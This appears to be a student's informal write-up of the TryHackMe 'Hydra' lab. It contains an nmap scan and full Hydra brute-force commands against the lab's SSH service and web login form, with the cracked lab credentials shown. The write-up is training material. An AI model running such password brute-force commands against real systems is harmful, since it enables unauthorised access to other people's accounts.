---
title: "hydra-THM"
tags:
  - fetus
---
- room link: https://tryhackme.com/room/hydra
# start 
- just doing this shit cuz its long overdue and i want those points :v
## nmap result:
- `nmap -sSCV -T4 -oN Dscan.txt`:
```sh
# Nmap 7.95 scan initiated Sat Jul 19 09:30:24 2025 as: /usr/lib/nmap/nmap -sSCV -T4 -oN Dscan.txt 10.10.202.181
Nmap scan report for 10.10.202.181
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8b:34:0b:70:cb:b1:9e:3f:d0:97:4b:85:dd:c1:84:16 (RSA)
|   256 3c:ee:59:18:be:b8:b1:65:4b:2a:50:7f:0d:9f:81:86 (ECDSA)
|_  256 49:19:bd:1d:ae:ac:01:d9:9a:a1:d8:e2:55:74:b8:cf (ED25519)
80/tcp open  http    Node.js Express framework
| http-title: Hydra Challenge
|_Requested resource was /login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 19 09:31:19 2025 -- 1 IP address (1 host up) scanned in 55.75 seconds
```
- welp lets crack them creds :v
## ssh brute:
- `hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.10.120.54:22`:
```sh
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-20 03:18:38
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.120.54:22/
[22][ssh] host: 10.10.120.54   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-20 03:18:52
```
- welp that was ez
```sh
molly:butterfly
```
- got in with ssh and grabbed the flag after that. nothing worth noting down
## http post form brute:
- well got the post request payload from the network tab in inspect this time instead of burp <br>
![[hydra-THMHttpPostRequestDataFromNetworkTabSS.png]]
- `username=test&password=test` 
- `hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.120.54 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"`:<br>
![[hydra-THMHttpFormCracked.png]]
- creds
```sh
molly:sunshine
```
- logged in and got the flag afterwords ofc :v
# end
- meh. well at least my procrastinating ass finally poked around with the network tab in inspect :v